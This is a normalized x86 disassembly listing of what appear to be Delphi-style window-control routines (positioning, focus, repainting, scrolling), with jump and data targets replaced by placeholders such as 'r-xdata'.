mov si 0xffd0
call sub_404160
or bl al
dec edi
cmp edi 0xffffffff
jne r-xdata
sub_442ed8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
or [ ebx + 0x54 ] 0x4
mov dl 0x1
mov eax ebx
mov si 0xffd0
call sub_404160
and eax 0x7f
mov [ edi + 0xc ] eax
pop edi
pop esi
pop ebx
retn
sub_442efc
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor edx edx
mov eax ebx
mov si 0xffd0
call sub_404160
and eax 0x7f
mov [ edi + 0xc ] eax
pop edi
pop esi
pop ebx
retn
sub_442f34
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43e3d4
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov dx 0xb03d
mov eax ebx
call sub_440008
pop esi
pop ebx
retn
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov eax ebx
call sub_4408ec
sub_442f6c
push esi
mov esi eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov eax esi
mov si 0xffc1
call sub_404160
pop esi
retn
mov eax esi
call sub_43c81c
test al al
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x3c ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x3c ]
call sub_405324
push eax
call LoadKeyboardLayoutA
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x38 ]
call sub_405324
push eax
call LoadKeyboardLayoutA
jmp r-xdata
sub_442fec
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_440f30
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_43e504
sub_44304c
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax ebx
call sub_440ab4
test [ ebx + 0x51 ] 0x4
je r-xdata
xor edx edx
mov eax ebx
call sub_43fcf4
pop ebx
retn
sub_4430a4
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax ebx
call sub_443f88
test al al
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor edx edx
mov eax ebx
call sub_43fcf4
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
neg al
sbb eax eax
push eax
mov eax [ ebx + 0x1b4 ]
push eax
call EnableWindow
sub_443114
push ebx
mov ebx eax
mov eax ebx
call sub_43e2f0
mov eax ebx
call sub_443f88
test al al
je r-xdata
mov dx 0xb008
mov eax ebx
call sub_440008
pop ebx
retn
push 0x0
mov eax [ ebx + 0x68 ]
call sub_42364c
mov ecx eax
mov edx 0x30
mov eax ebx
call sub_43d400
sub_443150
push ebx
add esp 0xfffffff8
mov ebx eax
call GetCapture
test eax eax
jne r-xdata
pop ecx
pop edx
pop ebx
retn
push esp
call GetCursorPos
mov eax esp
xor edx edx
call sub_43a6b0
cmp ebx eax
jne r-xdata
push 0x1
mov eax ebx
call sub_443be8
mov ecx eax
mov edx 0x20
mov eax ebx
call sub_43d400
sub_443190
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_443f88
test al al
je r-xdata
pop esi
retn
push 0x37
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax esi
call sub_443be8
push eax
call SetWindowPos
cmp [ esi + 0x57 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x80 ]
sub_4431d0
push ebx
mov ebx eax
test [ ebx + 0x50 ] 0x10
je r-xdata
mov dx 0xb011
mov eax ebx
call sub_440008
pop ebx
retn
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax ebx
call sub_443f88
test al al
je r-xdata
mov eax [ ebx + 0x1b4 ]
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov eax ebx
call sub_443aec
sub_443210
push ebx
mov ebx eax
cmp [ ebx + 0x1dd ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
movzx edx [ eax + 0x1d9 ]
mov eax ebx
call sub_443dc4
cmp [ edx + 0x8 ] 0x0
setne al
mov edx eax
mov eax ebx
call sub_443dc4
jmp r-xdata
mov [ ebx + 0x1dd ] 0x1
sub_443270
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov edi [ ebx + 0x8 ]
movzx eax [ ebx + 0x4 ]
sub al 0x4
jb r-xdata
cmp [ edi + 0xc ] 0x0
je r-xdata
dec al
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ edi + 0xc ]
call sub_43ce58
jmp r-xdata
push 0x0
push 0x0
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax esi
call sub_43bc78
lea edx [ esp + 0x8 ]
xor ecx ecx
mov eax esi
call sub_440d20
mov ebp eax
mov [ ebx + 0xc ] ebp
test ebp ebp
jne r-xdata
jmp r-xdata
mov [ ebx + 0xc ] esi
sub_4432f8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43e460
mov edx esi
mov eax ebx
call sub_43ff98
pop esi
pop ebx
retn
sub_443314
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebp edx
mov [ esp ] eax
mov [ esp + 0x4 ] 0x1
mov eax [ esp ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov ecx [ ebp + 0x8 ]
movzx edx [ ebp + 0x4 ]
mov eax 0xb016
call sub_438c24
test eax eax
jne r-xdata
mov ebx [ esp ]
test ebx ebx
je r-xdata
movzx eax [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x4 ] 0x0
mov dl 0x1
mov eax [ esp ]
call sub_44e778
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
mov si 0xffd6
call sub_404160
mov edi eax
test edi edi
je r-xdata
mov edx ebp
mov eax ebx
mov si 0xffa5
call sub_404160
test al al
jne r-xdata
mov ebx [ ebx + 0x30 ]
test ebx ebx
jne r-xdata
cmp [ edi + 0x38 ] 0x0
je r-xdata
mov edx ebp
mov eax edi
mov si 0xffee
call sub_404160
test al al
jne r-xdata
sub_4433ac
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov [ esi + 0xc ] 0x1
movzx edx [ esi + 0x4 ]
mov eax ebx
call sub_444ed0
mov edx esi
mov eax ebx
call sub_443314
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
push ebx
movzx ecx [ esi + 0x4 ]
mov edx 0xb02e
mov eax ebx
call sub_43d400
test eax eax
jne r-xdata
xor edi edi
movzx eax [ esi + 0x4 ]
cmp eax 0x1b
jg r-xdata
add eax 0xffffffdb
sub eax 0x4
jb r-xdata
je r-xdata
mov edi 0x1
jmp r-xdata
sub eax 0x2
je r-xdata
mov edi 0x4
sub eax 0x3
je r-xdata
test edi edi
je r-xdata
jmp r-xdata
push 0x0
movzx ecx [ esi + 0x4 ]
mov edx 0xb01e
mov eax ebx
call sub_43d400
test eax eax
jne r-xdata
sub eax 0x6
je r-xdata
push 0x0
xor ecx ecx
mov edx 0x87
mov eax ebx
call sub_43d400
test eax edi
jne r-xdata
mov edi 0x2
jmp r-xdata
sub eax 0x4
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov dl 0x1
mov eax ebx
call sub_44e778
movzx ecx [ esi + 0x4 ]
mov edx 0xb005
call sub_43d400
test eax eax
jne r-xdata
jmp r-xdata
sub_443490
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
retn
movzx edi [ esi + 0x4 ]
movzx eax di
cmp eax 0x1b
jg r-xdata
add eax 0xffffffdb
sub eax 0x4
jb r-xdata
je r-xdata
push 0x0
movzx ecx di
mov edx 0xb01e
mov eax ebx
call sub_43d400
mov [ esi + 0xc ] eax
sub eax 0x2
jne r-xdata
sub eax 0x3
je r-xdata
sub eax 0x6
je r-xdata
sub eax 0x4
je r-xdata
jmp r-xdata
sub_4434e4
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
mov [ esi + 0xc ] 0x1
push 0x0
xor ecx ecx
mov edx 0x87
mov eax ebx
call sub_43d400
test al 0x80
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
mov eax [ esi + 0x8 ]
push eax
mov dl 0x1
mov eax ebx
call sub_44e778
movzx ecx [ esi + 0x4 ]
mov edx 0xb006
call sub_43d400
test eax eax
jne r-xdata
sub_443534
push ebx
push esi
mov esi edx
mov ebx eax
mov [ esi + 0xc ] 0x1
mov edx esi
mov eax ebx
call sub_443314
test al al
jne r-xdata
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
push ebx
movzx ecx [ esi + 0x4 ]
mov edx 0xb02e
mov eax ebx
call sub_43d400
test eax eax
jne r-xdata
mov eax [ esi + 0x8 ]
push eax
mov dl 0x1
mov eax ebx
call sub_44e778
movzx ecx [ esi + 0x4 ]
mov edx 0xb005
call sub_43d400
test eax eax
jne r-xdata
sub_443590
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ esi + 0x4 ] 0x20
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov dl 0x1
mov eax ebx
call sub_44e778
movzx ecx [ esi + 0x4 ]
mov edx 0xb006
call sub_43d400
mov [ esi + 0xc ] eax
sub_4435c4
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x40 ]
jne r-xdata
mov eax ebx
call sub_443f88
test al al
je r-xdata
cmp edi [ ebx + 0x44 ]
jne r-xdata
mov [ ebx + 0x40 ] esi
mov [ ebx + 0x44 ] edi
mov eax [ ebp + 0xc ]
mov [ ebx + 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_443f88
test al al
je r-xdata
mov eax [ ebx + 0x1b4 ]
push eax
call IsIconic
test eax eax
jne r-xdata
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x48 ]
jne r-xdata
mov eax ebx
call sub_43b644
mov eax ebx
call sub_43ecbc
mov eax ebx
mov edx [ eax ]
call [ edx + 0x5c ]
mov [ ebp - 0x2c ] 0x2c
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebx + 0x1b4 ]
push eax
call GetWindowPlacement
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_43ba58
lea esi [ ebp - 0x3c ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebx + 0x1b4 ]
push eax
call SetWindowPlacement
push 0x14
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push edi
push esi
push 0x0
mov eax [ ebx + 0x1b4 ]
push eax
call SetWindowPos
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x4c ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4436a0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov ebp eax
mov eax ebp
call sub_43ff78
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
mov edx edi
mov eax ebp
call sub_43ff3c
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov si 0xffec
call sub_404160
inc edi
dec ebx
jne r-xdata
sub_4436e8
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_43fa94
xor eax eax
push ebp
push sub_443786
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4436a0
cmp esi ebx
je r-xdata
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43bd50
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44378d
mov eax [ ebp - 0x4 ]
call sub_43fa9c
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x8c ] 0x20
je r-xdata
push esi
push ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x242 ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x242 ] eax
push esi
push ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x246 ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x246 ] eax
sub_443794
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edi eax
mov ebx [ edi + 0x1b4 ]
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
push ebx
call IsWindowVisible
test eax eax
jne r-xdata
mov [ esp + 0x8 ] al
cmp [ esp + 0x8 ] 0x0
je r-xdata
mov al 0x1
mov eax edi
call sub_43ff78
mov esi eax
dec esi
test esi esi
jl r-xdata
push 0x0
push 0x0
mov eax [ esp + 0xc ]
push eax
mov eax [ esp + 0xc ]
push eax
mov eax [ edi + 0x1b4 ]
push eax
call ScrollWindow
mov eax edi
call sub_43fabc
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebp ebp
mov eax [ esp ]
add [ ebx + 0x40 ] eax
mov eax [ esp + 0x4 ]
add [ ebx + 0x44 ] eax
jmp r-xdata
cmp [ ebx + 0x1b4 ] 0x0
jne r-xdata
inc ebp
dec esi
jne r-xdata
cmp [ esp + 0x8 ] 0x0
jne r-xdata
mov edx ebp
mov eax edi
call sub_43ff3c
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
push 0x14
mov eax ebx
mov edx [ eax + 0x4c ]
push edx
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x44 ]
add edx [ esp + 0x10 ]
push edx
mov edx [ eax + 0x40 ]
add edx [ esp + 0x10 ]
push edx
push 0x0
mov eax [ eax + 0x1b4 ]
push eax
call SetWindowPos
sub_443884
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ eax + 0x1cc ]
test edx edx
je r-xdata
mov eax [ eax + 0x1d0 ]
mov edx ebx
call sub_416824
mov edi eax
test edi edi
jl r-xdata
sub esi [ edx + 0x8 ]
cmp [ ebx + 0x1b4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x1d0 ]
mov eax [ edx + 0x8 ]
test esi esi
jge r-xdata
test esi esi
jne r-xdata
cmp eax esi
jg r-xdata
xor esi esi
mov eax [ ebx + 0x30 ]
mov ebp [ eax + 0x1d0 ]
mov eax [ ebp + 0x8 ]
dec eax
cmp esi eax
jne r-xdata
mov eax 0x1
jmp r-xdata
cmp edi esi
je r-xdata
mov esi eax
dec esi
cmp edi esi
jge r-xdata
xor eax eax
jmp r-xdata
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
push eax
mov eax [ ebx + 0x1b4 ]
push eax
call SetWindowPos
mov eax edx
mov edx edi
call sub_4166b4
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x1d0 ]
mov ecx ebx
mov edx esi
call sub_416844
cmp edi esi
jle r-xdata
lea edx [ esi + 0x1 ]
mov eax ebp
call sub_4167c8
call sub_443be8
jmp r-xdata
mov eax ebp
mov edx esi
call sub_4167c8
call sub_443be8
sub_44395c
push ebx
push esi
mov ebx [ eax + 0x30 ]
test ebx ebx
je r-xdata
mov ecx [ eax + 0x1b4 ]
test ecx ecx
je r-xdata
test dl dl
je r-xdata
pop esi
pop ebx
retn
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
and edx 0x7f
movzx edx [ edx * 2 + rw-data ]
push edx
push ecx
call SetWindowPos
xor ecx ecx
mov edx [ ebx + 0x1d0 ]
mov ecx [ edx + 0x8 ]
dec ecx
jmp r-xdata
add ecx edx
mov edx ecx
call sub_443884
pop esi
pop ebx
retn
mov edx [ esi + 0x8 ]
xor edx edx
mov esi [ ebx + 0x1cc ]
test esi esi
je r-xdata
sub_4439bc
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax ebx
call sub_443be8
push eax
call GetDC
push 0x12
push 0x0
mov eax ebx
call sub_443be8
push eax
call GetDCEx
jmp r-xdata
mov edx [ ebx + 0x1b4 ]
mov [ esi ] edx
pop esi
pop ebx
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dc70
call sub_4047d8
test eax eax
jne r-xdata
sub_443a20
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax ebx
call sub_443f88
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
push 0x0
mov ecx 0x1
mov edx 0xb034
call sub_43d400
test [ ebx + 0x50 ] 0x40
setne al
xor al 0x1
neg al
sbb eax eax
push eax
push 0x0
mov eax [ ebx + 0x1b4 ]
push eax
call InvalidateRect
call sub_42f0b8
call sub_42f1c0
test al al
je r-xdata
mov eax ebx
call sub_43ff78
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax ebx
call sub_43ff3c
mov edx [ eax ]
call [ edx + 0x80 ]
mov edx esi
mov eax ebx
call sub_43ff3c
test [ eax + 0x52 ] 0x4
je r-xdata
sub_443aec
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_43ba58
push 0x1
push 0x1
lea eax [ esp + 0x8 ]
push eax
call InflateRect
push 0xffffffff
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x1b4 ]
push eax
call InvalidateRect
add esp 0x10
pop ebx
retn
sub_443b24
push ebx
push esi
push ecx
mov ebx eax
mov [ esp ] 0x0
mov dl 0x1
mov eax ebx
call sub_44e778
mov esi eax
test esi esi
je r-xdata
movzx eax [ esp ]
pop edx
pop esi
pop ebx
retn
cmp esi ebx
je r-xdata
mov [ esp ] 0x1
cmp [ ebx + 0x57 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov ebx [ ebx + 0x30 ]
cmp esi ebx
jne r-xdata
sub_443b64
push ebx
mov ebx eax
mov dl 0x1
mov eax ebx
call sub_44e778
test eax eax
je r-xdata
cmp [ ebx + 0x1c4 ] 0x0
je r-xdata
mov edx ebx
call sub_4530ac
pop ebx
retn
mov dl 0x1
mov eax ebx
call sub_44e788
mov eax ebx
call sub_443be8
push eax
call SetFocus
jmp r-xdata
pop ebx
retn
sub_443ba0
push ebx
mov ebx eax
cmp [ ebx + 0x1b4 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
call GetFocus
cmp eax [ ebx + 0x1b4 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_443bc4
push ebx
mov ebx eax
cmp [ ebx + 0x1b4 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x98 ]
call sub_443bc4
sub_443bfc
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
mov [ esp ] eax
push 0x0
push esi
xor ecx ecx
mov edx 0x7fffffff
mov eax 0x7fffffff
call sub_415370
mov eax [ esp ]
call sub_43ff78
mov edi eax
dec edi
test edi edi
jl r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
mov [ esp + 0x4 ] 0x0
xor edx edx
mov eax [ ebx + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
cmp eax [ esi ]
jge r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov edx 0x1
mov eax [ ebx + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
cmp eax [ esi + 0x4 ]
jge r-xdata
xor edx edx
mov eax [ ebx + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov [ esi ] eax
inc [ esp + 0x4 ]
dec edi
jne r-xdata
test [ ebx + 0x51 ] 0x4
jne r-xdata
xor edx edx
mov eax [ ebx + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov ebp eax
mov edx 0x2
mov eax [ ebx + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
add ebp eax
cmp ebp [ esi + 0x8 ]
jle r-xdata
mov edx 0x1
mov eax [ ebx + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov [ esi + 0x4 ] eax
mov edx [ esp + 0x4 ]
mov eax [ esp ]
call sub_43ff3c
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
mov edx 0x1
mov eax [ ebx + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov ebp eax
mov edx 0x3
mov eax [ ebx + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
add ebp eax
cmp ebp [ esi + 0xc ]
jle r-xdata
xor edx edx
mov eax [ ebx + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov ebp eax
mov edx 0x2
mov eax [ ebx + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
add ebp eax
mov [ esi + 0x8 ] ebp
mov edx 0x1
mov eax [ ebx + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov ebp eax
mov edx 0x3
mov eax [ ebx + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
add ebp eax
mov [ esi + 0xc ] ebp
sub_443d30
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
mov [ ebx ] eax
xor eax eax
mov [ ebx + 0x4 ] eax
push ebx
mov eax esi
call sub_443be8
push eax
call ClientToScreen
pop esi
pop ebx
retn
sub_443d68
push ebx
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_443f88
test al al
je r-xdata
push 0x16
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_443be8
push eax
call SetWindowPos
mov eax ebx
mov edx [ eax ]
call [ edx + 0x5c ]
sub_443e20
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
or eax 0xffffffff
pop esi
pop ebx
retn
mov eax [ esi + 0x1c8 ]
mov edx ebx
call sub_416824
pop esi
pop ebx
retn
sub_443e44
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax ebx
call sub_443e20
movsx eax ax
test eax eax
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x30 ]
mov ebp [ edx + 0x1c8 ]
mov edx [ ebp + 0x8 ]
test si si
jge r-xdata
movsx ecx si
cmp edx ecx
jg r-xdata
xor esi esi
movsx edi si
cmp eax edi
je r-xdata
mov esi edx
dec esi
mov edx ebp
xchg edx eax
call sub_4166b4
mov edx edi
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x1c8 ]
mov ecx ebx
call sub_416844
sub_443eb8
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x1d8 ]
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x1d8 ] bl
mov eax esi
call sub_443f88
test al al
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb028
mov eax esi
call sub_43d400
push 0xfffffff0
mov eax [ esi + 0x1b4 ]
push eax
call GetWindowLongA
and eax 0xfffeffff
test bl bl
je r-xdata
push eax
push 0xfffffff0
mov eax [ esi + 0x1b4 ]
push eax
call SetWindowLongA
or eax 0x10000
sub_443f18
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_443f7c
push [ fs : eax ]
mov [ fs : eax ] esp
cmp dl [ ebx + 0x1db ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_443f83
lea eax [ ebp - 0x4 ]
call sub_406af4
retn
mov [ ebx + 0x1db ] dl
test [ ebx + 0x1c ] 0x10
setne al
xor al 0x1
test al dl
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
mov si 0xffc5
call sub_404160
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x1b0 ]
call sub_406b0c
sub_443f94
push ebx
push esi
push edi
add esp 0xffffffc4
mov ebx eax
mov eax [ ebx + 0x1b4 ]
push eax
call IsIconic
test eax eax
je r-xdata
push esp
mov eax [ ebx + 0x1b4 ]
push eax
call GetWindowRect
mov [ esp + 0x10 ] 0x2c
lea eax [ esp + 0x10 ]
push eax
mov eax [ ebx + 0x1b4 ]
push eax
call GetWindowPlacement
lea esi [ esp + 0x2c ]
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
jmp r-xdata
mov eax [ esp ]
mov [ ebx + 0x40 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x44 ] eax
mov eax [ esp + 0x8 ]
sub eax [ esp ]
mov [ ebx + 0x48 ] eax
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_43b644
add esp 0x3c
pop edi
pop esi
pop ebx
retn
push 0xfffffff8
mov eax [ ebx + 0x1b4 ]
push eax
call GetWindowLongA
mov esi eax
test esi esi
je r-xdata
push 0xfffffff0
mov eax [ ebx + 0x1b4 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
push esp
push esi
call ScreenToClient
lea eax [ esp + 0x8 ]
push eax
push esi
call ScreenToClient
sub_44404c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] edx
mov ebp eax
mov eax [ ebp + 0x1c8 ]
test eax eax
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
mov [ esp + 0x4 ] 0x0
mov eax [ ebp + 0x1c8 ]
mov edx [ esp + 0x4 ]
call sub_4167c8
mov ebx eax
mov edx ebx
mov eax [ esp ]
call sub_416668
mov edx [ esp ]
mov eax ebx
mov si 0xffb2
call sub_404160
inc [ esp + 0x4 ]
dec edi
jne r-xdata
sub_4440ac
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x5 ] cl
mov edi edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_4441a2
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov si 0xffb2
call sub_404160
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4441a9
mov eax [ ebp - 0x14 ]
call sub_403f64
retn
mov edx edi
mov eax [ ebp - 0x14 ]
call sub_416824
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0xffffffff
jne r-xdata
mov ebx [ ebp - 0x10 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
test ebx ebx
jne r-xdata
inc ebx
mov eax [ ebp - 0x14 ]
cmp ebx [ eax + 0x8 ]
jne r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
dec eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
dec ebx
mov eax [ ebp - 0x14 ]
mov ebx [ eax + 0x8 ]
mov edx ebx
mov eax [ ebp - 0x14 ]
call sub_4167c8
mov edi eax
mov eax edi
mov si 0xffb6
call sub_404160
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
cmp ebx [ ebp - 0x10 ]
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ edi + 0x1d8 ] 0x0
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov [ ebp - 0xc ] edi
mov eax [ edi + 0x30 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
